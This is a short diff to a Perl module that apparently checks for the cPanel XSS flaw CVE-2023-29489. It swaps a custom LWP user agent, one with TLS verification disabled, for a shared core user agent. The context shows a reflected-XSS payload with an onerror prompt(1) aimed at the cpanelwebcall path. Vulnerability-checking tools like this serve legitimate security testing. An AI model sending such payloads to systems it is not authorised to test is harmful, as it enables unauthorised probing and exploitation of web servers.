@@ -1,7 +1,7 @@
 package Spellbook::Advisory::CVE_2023_29489 {
     use strict;
     use warnings;
-    use LWP::UserAgent;
+    use Spellbook::Core::UserAgent;
 
     sub new {
         my ($self, $parameters) = @_;
@@ -18,13 +18,7 @@ package Spellbook::Advisory::CVE_2023_29489 {
                 $target = "https://$target";
             }
                     
-            my $userAgent = LWP::UserAgent -> new (
-                timeout  => 3,
-                ssl_opts => { 
-                    verify_hostname => 0,
-                    SSL_verify_mode => 0
-                }
-            );
+            my $userAgent = Spellbook::Core::UserAgent -> new();
 
             my @payloads = (
                 "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
